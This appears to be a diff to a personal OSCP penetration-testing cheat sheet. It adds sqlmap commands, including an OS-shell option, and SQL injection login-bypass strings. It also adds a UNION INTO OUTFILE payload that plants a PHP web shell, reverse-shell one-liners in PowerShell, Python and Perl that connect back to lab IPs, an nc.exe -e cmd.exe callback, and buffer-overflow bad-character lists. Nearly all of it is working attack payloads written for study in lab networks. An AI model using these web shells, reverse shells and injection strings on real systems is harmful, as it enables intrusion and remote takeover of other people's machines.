@@ -1,8 +1,10 @@
 # OSCP
-Stuff for OSCP...
+Links:
+- https://github.com/0x4D31/awesome-oscp 
+- https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html#preperation
+- https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97
 
 ## Discovery
-
 - Host discovery TCP:   
    `TOPTCP="$(grep -E "^[^#]*/tcp" /usr/share/nmap/nmap-services | sort -k 3nr | cut -f2 | cut -f1 -d/ | head -1000 | tr '\n' ',')"`   
    `nmap -n -sn --reason -PR -PE -PP -PM -PO -PY -PA -PS"$TOPTCP" -PU -iL targets.txt -oA nmap_host_discovery_arp_icmp_ip_sctp_tcp_udp`   
@@ -59,7 +61,8 @@ Stuff for OSCP...
    `apt-get install google-chrome-stable` 
    Aquatone Usage:  
    Collect data based on nmap report: `cat nmap.xml | /opt/aquatone/aquatone -nmap -chrome-path /usr/bin/google-chrome -out screenshots -ports xlarge` 
-   Run Aquatone on list of IPs with specific ports: `cat ips.txt | /opt/aquatone/aquatone -chrome-path /usr/bin/google-chrome -out screenshots -ports 25,80,161,264,443,2001,3478,4999,5222,6080,8443,18264,27299,38751` 
+   Run Aquatone on list of IPs with specific ports: `cat ips.txt | /opt/aquatone/aquatone -chrome-path /usr/bin/google-chrome -out screenshots -ports 25,80,161,264,443,2001,3478,4999,5222,6080,8443,18264,27299,38751`  
+
 - https://guif.re/webtesting
 - https://sushant747.gitbooks.io/total-oscp-guide/common_web-services.html 
 
@@ -81,10 +84,10 @@ Stuff for OSCP...
 ## NFS
 
 ## FTP
-- First check for anonymous access
-  `ftp $targetip` 
-  `Username: anonymous` 
-  `Password: anything` 
+- First check for anonymous access  
+  `ftp $targetip`  
+  `Username: anonymous`  
+  `Password: anything`  
 
 Path traversal: 
 - FTP: `ftp://10.11.1.125/../../../../windows/system32/wbem/logs/mofcomp.log`  
@@ -105,13 +108,13 @@ Path traversal:
 - SSH Tunnel with SSHuttle:  
   `sshuttle -vvr user@10.10.10.10 10.1.1.0/24` 
   With SSH Key:  
-  `sshuttle -vr root@10.10.10.13 172.16.1.0/24 --ssh-cmd 'ssh -i sshloginkey.txt'` 
+  `sshuttle -vr root@10.10.10.13 172.16.1.0/24 --ssh-cmd 'ssh -i sshloginkey.txt'`  
   Now all traffic to 172.16.1.0/24 will be sent to the tunnel
 
 ## SMTP
 - check if user exists:  
-  `nc -nv <ip address> 25` 
-  `VRFY <username>` 
+  `nc -nv <ip address> 25`  
+  `VRFY <username>`  
   automate with bash:  
   `for user in $(cat users.txt); do echo VRFY $user | nc -nv -w 1 192.168.100.100 25 2>/dev/null | grep ^"250";done` 
 
@@ -120,15 +123,36 @@ Path traversal:
 
 ## Exploits / Searchsploit
 - Update Searchsploit
-  `searchsploit -u` 
+  `searchsploit -u`  
 - Search exploit  
   `searchsploit $multiple $search $terms` 
 
 ## SQL Injection
+SQLMap
 - Use saved request from burp: (-p is parameter, can be removed if you add * to the param in the request file)  
   `sqlmap -r request.txt -p objectid --risk 3 --level 5` 
+- SQLMap Crawl:  
+  `sqlmap -u http://10.10.10.10 --crawl=1`
+- SQLMap Dump DB:  
+  `sqlmap -u http://10.10.10.10 --dbms=mysql --dump` 
+- SQLMap Shell:  
+  `sqlmap -u http://10.10.10.10 --dbms=mysql --os-shell` 
 - SQL Shell through UNION based SQL Injection in "TextBoxUsername" field:  
   `sqlmap -r request.txt -p TextBoxUsername --sql-shell --technique=U` 
+
+Bypasses  
+  `' or 1=1 LIMIT 1 --`  
+  `' or 1=1 LIMIT 1 -- -`  
+  `' or 1=1 LIMIT 1#`  
+  `' or 1#`  
+  `' or 1=1 --`  
+  `' or 1=1 -- -`  
+
+Queries
+- Upload php command injection file:  
+  `union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'`  
+- Load file:  
+  `union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6` 
 
 MySQL 
 - Enumerate tables:  
@@ -160,12 +184,12 @@ Windows:
   `powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` 
 - Python:  
   `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`  
-- If Perl is running on Windows:  
+- Perl:  
   `perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"$attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'` 
 
 PHP:
 - First modify the post request parameters to create a php file which executes the shell:  
-  `q=test&lang=en' union select all 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/newbackdoor.php';#` 
+  `q=test&lang=en' union select all 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/newbackdoor.php';#`  
   afterwards run the command to spawn a reverse shell:  
   `http://10.11.14.101/newbackdoor.php?cmd=c:\users\offsec\desktop\tools\netcat\nc.exe -nv 10.11.0.90 443 -e cmd.exe` 
 - Alternative:  
@@ -225,6 +249,8 @@ PHP:
 
 ### Others
 - `smbget -R smb://1.1.1.1/folder` 
+- LOLBins Windows: https://lolbas-project.github.io/
+- LOLBins Linux: https://gtfobins.github.io/
 
 ## PrivEsc Windows
 - Add new admin:
@@ -377,6 +403,25 @@ If you have path traversal plus a location with write access you can exploit tha
   `#!/usr/bin/python`  
   `import sys`  
   `for x in range(1,256):`  
-  `sys.stdout.write("\\x" + '{:02x}'.format(x))`   
+  `sys.stdout.write("\\x" + '{:02x}'.format(x))`  
+- Badchars:  
+  Bad characters
+  `badchars = (`  
+  `"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"`  
+  `"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"`  
+  `"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"`  
+  `"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"`  
+  `"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"`  
+  `"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"`  
+  `"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"`  
+  `"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"`  
+  `"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"`  
+  `"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"`  
+  `"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"`  
+  `"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"`  
+  `"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"`  
+  `"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"`  
+  `"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"`  
+  `"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )`  
 
 Generate shellcode (may need to use different encoder due to huge list of bad characters. x86/fnstenv_mov may help)
